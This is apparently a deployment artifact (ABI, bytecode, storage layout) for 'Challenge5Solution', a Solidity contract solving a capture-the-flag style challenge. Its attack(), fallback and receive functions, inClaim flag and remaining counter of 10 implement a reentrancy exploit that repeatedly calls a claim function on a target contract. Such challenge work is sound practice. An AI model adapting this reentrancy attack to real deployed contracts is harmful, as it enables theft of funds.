{
  "address": "0xaAaBED06c21B9d859fF22917eA68d23210BFaE40",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "remaining",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0xfa0009bbb48434e86822d2fcd28651b8aa62a3fe841c07765d4e9e174f0573aa",
  "args": [
    "0xB76AdFe9a791367A8fCBC2FDa44cB1a2c39D8F59"
  ],
  "numDeployments": 1,
  "solcInputHash": "832ff6c3f67d5f7e367610c1aef7f869",
  "bytecode": "0x608060405234801561001057600080fd5b5060405161034e38038061034e83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6102bb806100936000396000f3fe6080604052600436106100385760003560e01c806355234ec01461004f5780639e5faafc14610078578063d4b839921461008d57610047565b36610047576100456100c5565b005b6100456100c5565b34801561005b57600080fd5b5061006560015481565b6040519081526020015b60405180910390f35b34801561008457600080fd5b50610045610157565b34801561009957600080fd5b506000546100ad906001600160a01b031681565b6040516001600160a01b03909116815260200161006f565b600054600160a01b900460ff1680156100df575060018054115b156101555760018060008282546100f6919061025e565b909155505060008054604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b15801561013c57600080fd5b505af1158015610150573d6000803e3d6000fd5b505050505b565b600054600160a01b900460ff16156101a35760405162461bcd60e51b815260040161019a906020808252600490820152636275737960e01b604082015260600190565b60405180910390fd5b6000805460ff60a01b198116600160a01b178255600a600155604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b1580156101f957600080fd5b505af115801561020d573d6000803e3d6000fd5b50506000805460ff60a01b19811682556040805163e00d023f60e01b815290516001600160a01b03909216945063e00d023f9350600480820193929182900301818387803b15801561013c57600080fd5b8181038181111561027f57634e487b7160e01b600052601160045260246000fd5b9291505056fea2646970667358221220f2fa9b760a73fc1268f29579ca3a0681456c9f11920e6ca58f0317e83e36730664736f6c63430008140033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 10,
        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
        "label": "target",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 12,
        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
        "label": "inClaim",
        "offset": 20,
        "slot": "0",
        "type": "t_bool"
      },
      {
        "astId": 14,
        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
        "label": "remaining",
        "offset": 0,
        "slot": "1",
        "type": "t_uint256"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_bool": {
        "encoding": "inplace",
        "label": "bool",
        "numberOfBytes": "1"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}